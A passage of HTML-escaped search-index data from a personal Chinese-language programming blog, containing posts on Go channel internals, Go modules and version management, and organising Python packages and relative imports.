&lt;li&gt;使用channel控制子协程&lt;/li&gt;
&lt;li&gt;waitGroup信号量机制控制子协程&lt;/li&gt;
&lt;li&gt;Context上下文控制子协程&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;channel&#34;&gt;channel&lt;/h2&gt;
&lt;h3 id=&#34;简单介绍&#34;&gt;简单介绍&lt;/h3&gt;
&lt;p&gt;channel主要是提供给两个协程之间消息传递的，channel分为&lt;strong&gt;同步&lt;/strong&gt;和&lt;strong&gt;异步&lt;/strong&gt;两种。&lt;/p&gt;
&lt;p&gt;同步的channel缓冲区大小为1，当缓冲区存在数据，发送发阻塞，直到数据被接收方取出；当缓冲区为空，接收方阻塞，直到发送方发送数据。&lt;/p&gt;
&lt;p&gt;异步的channel缓冲区大小大于1，当缓冲区满，发送发阻塞，直到有接收方取出数据；当缓冲区为空，接收方阻塞，直到发送方发送数据。&lt;/p&gt;
&lt;h3 id=&#34;channel实现原理-2&#34;&gt;channel实现原理&lt;/h3&gt;
&lt;p&gt;channel数据结构(runtime/chan.go)：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type hchan struct {
 qcount   uint           // total data in the queue（循环队列元素数量）
 dataqsiz uint           // size of the circular queue（循环队列大小）
 buf      unsafe.Pointer // points to an array of dataqsiz elements（循环队列指针）
 elemsize uint16 //chan中元素大小
 closed   uint32 //是否已经close
 elemtype *_type // element type（chan元素类型）
 sendx    uint   // send index（send在buf中索引）
 recvx    uint   // receive index（recv在buf中索引）
 recvq    waitq  // list of recv waiters（receive的等待队列）
 sendq    waitq  // list of send waiters（sender等待队列）

 // lock protects all fields in hchan, as well as several
 // fields in sudogs blocked on this channel.
 //
 // Do not change another G&#39;s status while holding this lock
 // (in particular, do not ready a G), as this can deadlock
 // with stack shrinking.
 lock mutex //互斥锁，保护所有字段，上面注释已经讲得非常明确了
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;chan初始化&#34;&gt;chan初始化&lt;/h4&gt;
&lt;p&gt;chan在初始化时，会根据容量大小选择调用&lt;code&gt;makechan64&lt;/code&gt;或者&lt;code&gt;makechan&lt;/code&gt;，其中&lt;code&gt;makechan64&lt;/code&gt;只是做了size检查，然后底层还是调用&lt;code&gt;makechan&lt;/code&gt;实现的，&lt;code&gt;makechan&lt;/code&gt;来生成&lt;code&gt;hchan&lt;/code&gt;对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func makechan(t *chantype, size int) *hchan {
    elem := t.elem
    //编译器会检查类型是否安全
    // compiler checks this but be safe.
    if elem.size &amp;gt;= 1&amp;lt;&amp;lt;16 {//是否 &amp;gt;= 2^16
        throw(&amp;quot;makechan: invalid channel element type&amp;quot;)
    }
    if hchanSize%maxAlign != 0 || elem.align &amp;gt; maxAlign {
        throw(&amp;quot;makechan: bad alignment&amp;quot;)
    }
    mem, overflow := math.MulUintptr(elem.size, uintptr(size))
    if overflow || mem &amp;gt; maxAlloc-hchanSize || size &amp;lt; 0 {
        panic(plainError(&amp;quot;makechan: size out of range&amp;quot;))
    }
    var c *hchan
    switch {
        case mem == 0:
        // chan的size或元素的size为0，就不必创建buf
        c = (*hchan)(mallocgc(hchanSize, nil, true))
        // 竞争检测器使用此位置进行同步
        c.buf = c.raceaddr()
        case elem.ptrdata == 0:
        // 元素不是指针，分配一块连续的内存给hchan数据结构和buf
        c = (*hchan)(mallocgc(hchanSize+mem, nil, true))
        // hchan数据结构后面紧接着就是buf
        c.buf = add(unsafe.Pointer(c), hchanSize)
        default:
        // Elements contain pointers.
        c = new(hchan)
        c.buf = mallocgc(mem, elem, true)
    }
    // 将元素大小、类型、容量都记录下来
    c.elemsize = uint16(elem.size)
    c.elemtype = elem
    c.dataqsiz = uint(size)
    lockInit(&amp;amp;c.lock, lockRankHchan)
    if debugChan {
        print(&amp;quot;makechan: chan=&amp;quot;, c, &amp;quot;; elemsize=&amp;quot;, elem.size, &amp;quot;; dataqsiz=&amp;quot;, size, &amp;quot;\n&amp;quot;)
    }
    return c
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其实就是根据不同容量和元素类型，来分配不同对象来初始化chan对象的字段，最后返回hchan对象。&lt;/p&gt;
&lt;h4 id=&#34;send方法&#34;&gt;send方法&lt;/h4&gt;
&lt;p&gt;send方法底层调用时会发生：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;锁定整个channel；&lt;/li&gt;
&lt;li&gt;首先判断chan是否为nil(未初始化)，如果是nil，发送者会永远阻塞；&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;如果chan不为nil，并且chan满了，则直接返回；&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;如果chan被close了，会引发panic；&lt;/li&gt;
&lt;li&gt;如果有recvq有等待，说明buf为空，那么直接从recvq中取出一个等待的goroutine，并将数据直接写入；&lt;/li&gt;
&lt;li&gt;如果没有recvq，考虑buf空间是不是已满，如果队列未满，则将数据拷贝到buf中(通过哦memmove()函数内存拷贝)；如果队列满了，那么发送者的goroutine就会加入到发送者的等待队列中并阻塞，直到被唤醒(数据被取走，或者chan被close)。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;recv方法&#34;&gt;recv方法&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;如果chan为nil，接收者会被永远阻塞；&lt;/li&gt;
&lt;li&gt;如果chan不为nil，但chan为空，接收者就会被阻塞，直到有sender发送数据或chan被close；&lt;/li&gt;
&lt;li&gt;如果chan被close了，并且队列中没有缓存的元素，那么返回；&lt;/li&gt;
&lt;li&gt;如果存在sender等待：如果是同步的channel，那么直接将sender的数据复制给reveiver，否则就从buf中；取出一个元素给reveiver，把sender的数据添加到队列尾部；&lt;/li&gt;
&lt;li&gt;如果没有sender等待：如果队列中有元素，就取出一个元素给receiver；如果队列中没有元素，那么当前receiver就会被阻塞，直到它从sender中接收了数据，或者chan被close才返回。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我认为上面原理性的东西了解以下就可以，掌握它的特性即可，在生产环境中避免出现死锁或者无限制的协程创建等问题。&lt;/p&gt;
&lt;h3 id=&#34;channel状态&#34;&gt;channel状态&lt;/h3&gt;
&lt;p&gt;channel有三种状态：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;nil，即没有初始化的状态；&lt;/li&gt;
&lt;li&gt;正常状态，可以进行正常读写；&lt;/li&gt;
&lt;li&gt;closed已关闭&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;向不同的状态的channel收发数据：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;向nil状态的channel收发，会进入阻塞状态；&lt;/li&gt;
&lt;li&gt;向已关闭的channel发送数据，会引发panic；&lt;/li&gt;
&lt;li&gt;向已关闭的channel接收数据，会返回缓冲值或零值。&lt;/li&gt;
&lt;li&gt;close nil/closed状态的channel会引发panic&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当channel使用完毕，可以使用内置函数&lt;code&gt;close()&lt;/code&gt;函数来关闭channel。channel是引用类型，channel是可以进行垃圾回收的，所以关闭channel并不是必须的，只要没有协程引用channel，最终就会被GC处理。&lt;/p&gt;
&lt;p&gt;在使用的过程中不要让协程阻塞到channel上，这种情况很难检测到，而且会造成channel和阻塞在channel的协程占有的资源无法被GC清理最终导致内存泄漏。&lt;/p&gt;
&lt;h3 id=&#34;使用场景&#34;&gt;使用场景&lt;/h3&gt;
&lt;p&gt;https://zhuanlan.zhihu.com/p/408598288&lt;/p&gt;
">【go】channel原理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/go-go-module-ban-ben-guan-li/"" data-c="
          &lt;h1 id=&#34;包和模块&#34;&gt;包和模块&lt;/h1&gt;
&lt;h2 id=&#34;gopath&#34;&gt;GOPATH&lt;/h2&gt;
&lt;p&gt;进行golang开发时的工作空间，你编写的go源代码和编译后生成的可执行程序以及下载的第三方包都将存放在GOPATH下。&lt;/p&gt;
&lt;p&gt;注意，GOPATH只是一个普通的文件目录并且你所有的编码工作都应该在该目录下完成(golang 1.11版本引入 包依赖管理工具go mod，可以在GOPATH以外编写go程序)。需要创建环境变量指定GOPATH位置。&lt;/p&gt;
&lt;p&gt;GOPATH的目录结构：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;bin：存放编译后的可执行文件&lt;/li&gt;
&lt;li&gt;src：存放GO程序源码，每个目录对应一个包&lt;/li&gt;
&lt;li&gt;pkg：包对象&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;GOPATH可以包含多个目录，但这些目录不能和go的安装目录相同。&lt;/p&gt;
&lt;h3 id=&#34;第三方包的导入&#34;&gt;第三方包的导入&lt;/h3&gt;
&lt;p&gt;如果项目中需要引入第三方包，则使用import导入包，例如&lt;code&gt;import &amp;quot;github.com/go-redis/redis&amp;quot;&lt;/code&gt;，然后使用&lt;code&gt;go get github.com/go-redis/redis&lt;/code&gt;命令将该包下载下来到GOPATH/pkg/github.com/go-redis/redis目录下。&lt;/p&gt;
&lt;p&gt;下载的过程：go会将包拼接成https协议的URL地址，例如https://github.com/go-redis/redis，go的第三方包是存储在像git或SVN这样的在线版本控制管理系统上的，go目前支持的在线版本管理类型：Bazaar(.bar)/Fossil(.fossil)/Git(.git)/Mercurial(.hg)/Subversion(.svn)&lt;/p&gt;
&lt;p&gt;所以在示例中，go首先会解析github.com/go-redis/redis.git。其次根据支持的协议依次尝试clone该包，若该在线版本管理系统支持多种协议，那么go会一次尝试。然后将包clone到GOPATH/pkg下。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;缺点：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;多个项目都保存在GOPATH/src下，所有项目导入的第三方包都在GOPATH/pkg下，造成项目比较混乱。&lt;/li&gt;
&lt;li&gt;导入的第三方包都会以最master分支的新版本进行下载，且不能指定版本。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;modules&#34;&gt;Modules&lt;/h2&gt;
&lt;p&gt;是 Go 1.11 版本之后引入的，Go 1.11 之前使用 $GOPATH 机制，现在官方更提倡使用go modules。go modules 可以算作是较为完善的包管理工具。同时支持代理，国内也能享受高速的第三方包镜像服务。&lt;/p&gt;
&lt;p&gt;go modules 在 1.13 版本仍是可选使用的，通过设置环境变量&lt;code&gt;GO111MODULE &lt;/code&gt;来选择是否开启go mod。&lt;code&gt;GO111MODULE &lt;/code&gt;共有三个值：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;auto：默认值，如果当前目录不在&lt;code&gt;$GOPATH&lt;/code&gt;并且当前目录或者父目录下有go.mod文件，则使用go modules，否则仍使用GOPATH mode。&lt;/li&gt;
&lt;li&gt;on：使用go module，忽略GOPATH目录。&lt;/li&gt;
&lt;li&gt;off：GOPATH mode，只查找GOPATH。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Modules可以满足：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;开发者可以在任意目录下工作，不仅仅是GOPATH指定的目录下&lt;/li&gt;
&lt;li&gt;可以安装依赖包的指定版本，而不是只能从master分支安装最新的版本。&lt;/li&gt;
&lt;li&gt;可以导入同一个依赖包的多个版本&lt;/li&gt;
&lt;li&gt;有一个罗列当前项目所依赖包的列表。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一个module也是可以像package一样共享的。因此，module也必须是一个git仓库或其它go可支持的代码控制系统，因此，官方给的建议是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个module必须是一个代码控制系统的仓库，并且一个仓库应该只能包含一个module；&lt;/li&gt;
&lt;li&gt;一个module应该包含一个或多个package&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;在使用go modules时，GOPATH是无意义的，不过还是会把下载的依赖存储在&lt;code&gt;GOPATH/src/mod&lt;/code&gt;中，也会把&lt;code&gt;go install&lt;/code&gt;的结果放在&lt;code&gt;GOPATH/bin&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;package&#34;&gt;Package&lt;/h3&gt;
&lt;p&gt;一般来说，一个文件夹可以作为 package，一个module包含多个package的目录，同一个 package 内部变量、类型、方法等定义可以相互看到。go程序的第一行语句必须是&lt;code&gt;package pkgname&lt;/code&gt;。对于可执行文件的包必须是&lt;code&gt;main&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;比如我们新建一个文件 &lt;code&gt;calc.go&lt;/code&gt;， &lt;code&gt;main.go&lt;/code&gt; 平级，分别定义 add 和 main 方法。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// calc.go
package main

func add(num1 int, num2 int) int {
	return num1 + num2
}
// main.go
package main

import &amp;quot;fmt&amp;quot;

func main() {
	fmt.Println(add(3, 5)) // 8
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行 &lt;code&gt;go run main.go&lt;/code&gt;，会报错，add 未定义：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./main.go:6:14: undefined: add
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为 &lt;code&gt;go run main.go&lt;/code&gt; 仅编译 main.go 一个文件，所以命令需要换成&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go run main.go calc.go
8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go run .
8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Go 语言也有 Public 和 Private 的概念，粒度是包。如果类型/接口/方法/函数/字段的首字母大写，则是 Public 的，对其他 package 可见，如果首字母小写，则是 Private 的，对其他 package 不可见。&lt;/p&gt;
&lt;h3 id=&#34;go-modules的创建&#34;&gt;go modules的创建&lt;/h3&gt;
&lt;p&gt;在一个空文件夹下，初始化一个 Module&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go mod init github.com/xxx/encodex
go: creating new go.mod: module github.com/xxx/encodex
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时，在当前文件夹下生成了&lt;code&gt;go.mod&lt;/code&gt;，这个文件记录当前模块的模块名、go的版本以及所有依赖包的版本。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mod&#34;&gt;module github.com/xxx/encodex

go 1.13
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后在创建一个文件夹(package)hash，然后创建一个hash.go文件，添加代码，这样就可以当作一个module使用了，也可以把这个module发布到github上。&lt;/p&gt;
&lt;p&gt;首先需要在github上创建代码仓库，然后将本地代码push上去，在发布之前，需要给module指定语义化版本，一般由字符&lt;code&gt;vMajor.Minor.patch&lt;/code&gt;构成，&lt;code&gt;v&lt;/code&gt;是固定字符，&lt;code&gt;Major&lt;/code&gt;代表主版本，&lt;code&gt;Minor&lt;/code&gt;代表此版本，&lt;code&gt;Patch&lt;/code&gt;代表不定版本。只有在版本不兼容之前版本时，才会改动主版本号，当兼容时只改动次版本号，当对此版本做了问题的修复时会改动patch。对于git的每次提交都可以为其创建一个语义化版本名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git tag v1.0.0

git push --tag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;到这里module就发布成功了。&lt;/p&gt;
&lt;h3 id=&#34;第三方module的使用&#34;&gt;第三方module的使用&lt;/h3&gt;
&lt;p&gt;接着，我们在当前目录下新建文件 &lt;code&gt;main/main.go&lt;/code&gt;，添加如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;fmt&amp;quot;

	&amp;quot;github.com/xxx/encodex/hash&amp;quot;
)

func main() {
	...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行&lt;code&gt;go get github.com/xxx/encodex/hash@v1.0.0&lt;/code&gt;，可以指定包的具体版本，也可以不指定，不指定就会下载最新版本。&lt;/p&gt;
&lt;p&gt;go.mod文件中会增加一条语句&lt;code&gt;require github.com/xxx/encodex v1.0.0&lt;/code&gt;，下载的包会存储在&lt;code&gt;GOPATH/pkg/mod/github.com/xxx/encodex&lt;/code&gt;下。&lt;/p&gt;
&lt;h3 id=&#34;依赖包版本升级&#34;&gt;依赖包版本升级&lt;/h3&gt;
&lt;p&gt;时间长了项目所依赖的第三方包可能会有新的升级，比如修复了一个bug。如果我们只想升级补丁版本path，则可以使用命令&lt;code&gt;go get -u=patch&lt;/code&gt;；如果是想更新次版本号，直接使用&lt;code&gt;go get -u&lt;/code&gt;，该命令如果次版本有升级会升级次版本，如果没有次版本则升级补丁版本。如果想升级到指定版本可以使用&lt;code&gt;go get module@version&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;如果想升级大版本，因为一个大的版本和之前的版本不兼容，所以go会认为是一个全新的module，因此需要在代码中import对应的新版本，并使用&lt;code&gt;go get&lt;/code&gt;重新下载。&lt;/p&gt;
&lt;p&gt;https://blog.csdn.net/RA681t58CJxsgCkJ31/article/details/123911038&lt;/p&gt;
">【go】go module版本管理</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/python-mo-kuai-he-bao-guan-li/"" data-c="
          &lt;h2 id=&#34;1-构建一个模块的层级包&#34;&gt;1 构建一个模块的层级包&lt;/h2&gt;
&lt;p&gt;封装成包是很简单的。在文件系统上组织你的代码，并确保每个目录都定义了一个&lt;code&gt;__init__.py&lt;/code&gt;文件。 例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;graphics/
    __init__.py
    primitive/
        __init__.py
        line.py
        fill.py
        text.py
    formats/
        __init__.py
        png.py
        jpg.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一旦你做到了这一点，你应该能够执行各种import语句，如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import graphics.primitive.line
from graphics.primitive import line
import graphics.formats.jpg as jpg
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;讨论&#34;&gt;讨论&lt;/h3&gt;
&lt;p&gt;定义模块的层次结构就像在文件系统上建立目录结构一样容易。 文件&lt;code&gt;__init__.py&lt;/code&gt;的目的是要包含不同运行级别的包的可选的初始化代码。 举个例子，如果你执行了语句&lt;code&gt;import graphics&lt;/code&gt;， 文件&lt;code&gt;graphics/__init__.py&lt;/code&gt;将被导入，建立&lt;code&gt;graphics&lt;/code&gt;命名空间的内容。像&lt;code&gt;import graphics.format.jpg&lt;/code&gt;这样导入，文件&lt;code&gt;graphics/__init__.py&lt;/code&gt;和文件&lt;code&gt;graphics/formats/__init__.py&lt;/code&gt;将在文件&lt;code&gt;graphics/formats/jpg.py&lt;/code&gt;导入之前导入。&lt;/p&gt;
&lt;p&gt;绝大部分时候让&lt;code&gt;__init__.py&lt;/code&gt;空着就好，但是有些情况下可能包含代码。 举个例子，&lt;code&gt;__init__.py&lt;/code&gt;能够用来自动加载子模块:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# graphics/formats/__init__.py
from . import jpg
from . import png
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;像这样一个文件,用户可以仅仅通过&lt;code&gt;import grahpics.formats&lt;/code&gt;来代替&lt;code&gt;import graphics.formats.jpg&lt;/code&gt;以及&lt;code&gt;import graphics.formats.png&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__init__.py&lt;/code&gt;的其他常用用法包括将多个文件合并到一个逻辑命名空间，这将在4小节讨论。&lt;/p&gt;
&lt;p&gt;敏锐的程序员会发现，即使没有&lt;code&gt;__init__.py&lt;/code&gt;文件存在，python仍然会导入包。如果你没有定义&lt;code&gt;__init__.py&lt;/code&gt;时，实际上创建了一个所谓的“命名空间包”，这将在5小节讨论。如果你着手创建一个新的包的话，包含一个&lt;code&gt;__init__.py&lt;/code&gt;文件吧。&lt;/p&gt;
&lt;h2 id=&#34;2-控制模块被全部导入的内容&#34;&gt;2 控制模块被全部导入的内容&lt;/h2&gt;
&lt;p&gt;当使用&lt;code&gt;from module import *&lt;/code&gt;语句时，希望对从模块或包导出的符号进行限制，即只导出部分内容。&lt;/p&gt;
&lt;p&gt;可以定义一个变量&lt;code&gt;__all__&lt;/code&gt;来明确地列出需要导出的内容。&lt;/p&gt;
&lt;p&gt;举个例子:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# somemodule.py
def spam():
    pass

def grok():
    pass

blah = 42
# Only export &#39;spam&#39; and &#39;grok&#39;
__all__ = [&#39;spam&#39;, &#39;grok&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;讨论-2&#34;&gt;讨论&lt;/h3&gt;
&lt;p&gt;尽管强烈反对使用&lt;code&gt;from module import *&lt;/code&gt;，但是在定义了大量变量名的模块中频繁使用。如果你不做任何事, 这样的导入将会导入所有不以下划线开头的。 另一方面,如果定义了&lt;code&gt;__all__&lt;/code&gt; , 那么只有被列举出的东西会被导出。&lt;/p&gt;
&lt;p&gt;如果你将&lt;code&gt;__all__&lt;/code&gt;定义成一个空列表，没有东西将被导入。 如果&lt;code&gt;__all__&lt;/code&gt;包含未定义的名字, 在导入时引起&lt;code&gt;AttributeError&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;3-使用相对路径名导入包中子模块&#34;&gt;3 使用相对路径名导入包中子模块&lt;/h2&gt;
&lt;p&gt;将代码组织成包，想用import语句从另一个包名没有硬编码过的包中导入子模块。&lt;/p&gt;
&lt;p&gt;使用包的相对导入，使一个模块导入同一个包的另一个模块。举个例子，假设文件组织如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mypackage/
    __init__.py
    A/
        __init__.py
        spam.py
        grok.py
    B/
        __init__.py
        bar.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果模块&lt;code&gt;mypackage.A.spam&lt;/code&gt;要导入同目录下的模块&lt;code&gt;grok&lt;/code&gt;，它应该包括的import语句如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# mypackage/A/spam.py
from . import grok
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果模块&lt;code&gt;mypackage.A.spam&lt;/code&gt;要导入不同目录下的模块B.bar，它应该使用的import语句如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# mypackage/A/spam.py
from ..B import bar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;两个import语句都没包含顶层包名，而是使用了spam.py的相对路径。&lt;/p&gt;
&lt;h3 id=&#34;讨论-3&#34;&gt;讨论&lt;/h3&gt;
&lt;p&gt;在包内，既可以使用相对路径也可以使用绝对路径来导入。 举个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# mypackage/A/spam.py
from mypackage.A import grok # OK
from . import grok # OK
import grok # Error (not found)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;**像mypackage.A这样使用绝对路径名的不利之处是这将顶层包名硬编码到你的源码中。**如果你想重新组织它，你的代码将更脆，很难工作。 举个例子，如果你改变了包名，你就必须检查所有文件来修正源码。 同样，硬编码的名称会使移动代码变得困难。举个例子，也许有人想安装两个不同版本的软件包，只通过名称区分它们。 如果使用相对导入，那一切都ok，然而使用绝对路径名很可能会出问题。&lt;/p&gt;
&lt;p&gt;import语句的 &lt;code&gt;.&lt;/code&gt; 和 &lt;code&gt;..&lt;/code&gt; 看起来很滑稽, 但它指定目录名.为当前目录，..B为目录../B。这种语法只适用于import。 举个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from . import grok # OK
import .grok # ERROR
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;mark&gt;尽管使用相对导入看起来像是浏览文件系统，但是不能到定义包的目录之外。也就是说，使用点的这种模式从不是包的目录中导入将会引发错误。&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;另外，只能导入顶层模块下的内部模块，不能导入和顶层模块相同目录的模块，如果包的部分被作为脚本直接执行，那相对路径的导入这种方式可能会不起作用。&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;% python3 mypackage/A/spam.py # Relative imports fail
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另一方面，如果你使用Python的-m选项来执行先前的脚本，相对导入将会正确运行。 例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;% python3 -m mypackage.A.spam # Relative imports work
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也就是说&lt;strong&gt;包&lt;/strong&gt;中的文件(模块)不能单独作为主函数运行。（如果一个模块被直接运行，则此时它自己就是顶层模块，不存在层次结构，所以找不到和其同层的模块和上层模块，但可以使用绝对路径；如果非要使用相对路径，把需要导入的模块放到执行模块的内部模块）&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;from package_A import module_B/package_B&lt;/code&gt;中，先执行的是&lt;code&gt;package_A&lt;/code&gt;中的&lt;code&gt;__init__.py&lt;/code&gt;文件，再执行后面的&lt;code&gt;module_B&lt;/code&gt;文件或者&lt;code&gt;package_B&lt;/code&gt;中的&lt;code&gt;__init__.py&lt;/code&gt;文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在顶层模块内部的各模块，可以相对导入；这些模块对于顶层模块同目录或者更上层目录则不能相对导入。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最后，不推荐使用相对路径。&lt;/p&gt;
&lt;h2 id=&#34;4-将模块分割成多个文件&#34;&gt;4 将模块分割成多个文件&lt;/h2&gt;
&lt;p&gt;你想将一个模块分割成多个文件。但是你不想将分离的文件统一成一个逻辑模块时使已有的代码遭到破坏。&lt;/p&gt;
&lt;p&gt;程序模块可以通过变成包来分割成多个独立的文件。考虑下下面简单的模块：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# mymodule.py
class A:
    def spam(self):
        print(&#39;A.spam&#39;)

class B(A):
    def bar(self):
        print(&#39;B.bar&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;假设你想mymodule.py分为两个文件，每个定义的一个类。要做到这一点，首先用mymodule目录来替换文件mymodule.py。 这这个目录下，创建以下文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;mymodule/
    __init__.py
    a.py
    b.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在a.py文件中插入以下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# a.py
class A:
    def spam(self):
        print(&#39;A.spam&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在b.py文件中插入以下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# b.py
from .a import A
class B(A):
    def bar(self):
        print(&#39;B.bar&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后，在 &lt;code&gt;__init__.py&lt;/code&gt; 中，将2个文件粘合在一起：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# __init__.py
from .a import A
from .b import B
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果按照这些步骤，所产生的包MyModule将作为一个单一的逻辑模块：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; import mymodule
&amp;gt;&amp;gt;&amp;gt; a = mymodule.A()
&amp;gt;&amp;gt;&amp;gt; a.spam()
A.spam
&amp;gt;&amp;gt;&amp;gt; b = mymodule.B()
&amp;gt;&amp;gt;&amp;gt; b.bar()
B.bar
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;讨论-4&#34;&gt;讨论&lt;/h3&gt;
&lt;p&gt;在这个章节中的主要问题是一个设计问题，不管你是否希望用户使用很多小模块或只是一个模块。举个例子，在一个大型的代码库中，你可以将这一切都分割成独立的文件，让用户使用大量的import语句，就像这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from mymodule.a import A
from mymodule.b import B
...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样能工作，但这让用户承受更多的负担，用户要知道不同的部分位于何处。通常情况下，将这些统一起来，使用一条import将更加容易，就像这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from mymodule import A, B
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对后者而言，让mymodule成为一个大的源文件是最常见的。但是，这一章节展示了如何合并多个文件合并成一个单一的逻辑命名空间。 这样做的关键是创建一个包目录，使用 &lt;code&gt;__init__.py&lt;/code&gt; 文件来将每部分粘合在一起。&lt;/p&gt;
&lt;p&gt;当一个模块被分割，你需要特别注意交叉引用的文件名。举个例子，在这一章节中，B类需要访问A类作为基类。用包的相对导入 &lt;code&gt;from .a import A&lt;/code&gt; 来获取。&lt;/p&gt;
&lt;p&gt;整个章节都使用包的相对导入来避免将顶层模块名硬编码到源代码中。这使得重命名模块或者将它移动到别的位置更容易。（见3小节）&lt;/p&gt;
&lt;p&gt;作为这一章节的延伸，将介绍延迟导入。如图所示，&lt;code&gt;__init__.py&lt;/code&gt;文件一次导入所有必需的组件的。但是对于一个很大的模块，可能你只想组件在需要时被加载。 要做到这一点，&lt;code&gt;__init__.py&lt;/code&gt;有细微的变化：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# __init__.py
def A():
    from .a import A
    return A()

def B():
    from .b import B
    return B()
&lt;/code&gt;&lt;/pre&gt;
